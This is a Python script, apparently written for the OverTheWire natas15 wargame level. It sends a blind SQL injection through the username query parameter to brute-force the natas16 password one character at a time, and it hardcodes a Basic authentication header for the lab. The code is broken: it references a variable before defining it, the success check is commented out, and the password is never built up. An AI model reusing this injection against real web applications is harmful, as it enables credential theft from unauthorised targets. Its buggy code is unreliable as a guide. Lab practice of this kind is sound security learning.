import requests,string
password = ("wA")
alphanum = string.ascii_letters + string.digits
url = "http://natas15.natas.labs.overthewire.org/"
#
querystring = {"debug":"yes","username":"natas16\" and password like \"" + attempt + "%"}
length = len(password)
headers = {
    'authorization': "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==",
    'cache-control': "no-cache",
    'postman-token': "a485c7b5-2c71-52cf-fa16-62c92545ecf4"
    }
for attempt in alphanum: 
     querystring = {"debug":"yes","username":"natas16\" and password like \"" + attempt + "%"}
     response = requests.request("GET", url, headers=headers, params=querystring)
     print(response.text)
  
# if "This user exists." in response:
#  string.append(password)

